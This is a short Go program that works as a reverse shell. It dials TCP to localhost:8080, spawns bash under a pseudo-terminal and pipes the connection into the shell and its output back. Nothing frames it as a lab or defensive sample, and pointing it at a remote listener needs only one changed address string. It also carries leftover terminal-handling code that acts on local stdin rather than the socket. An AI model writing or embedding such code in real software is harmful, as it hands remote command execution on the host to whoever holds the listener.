package main

import (
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/kr/pty"
	"golang.org/x/crypto/ssh/terminal"
)

func newShell(conn net.Conn) error {
	// Create arbitrary command.
	c := exec.Command("bash")

	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		return err
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	// Set stdin in raw mode.
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	// Copy stdin to the pty and the pty to stdout.
	go func() { _, _ = io.Copy(ptmx, conn) }()
	_, _ = io.Copy(conn, ptmx)

	return nil
}

func main() {
	conn, err := net.Dial("tcp", "localhost:8080")
	if err != nil {
		panic(err)
	}

	if err := newShell(conn); err != nil {
		log.Fatal(err)
	}
}
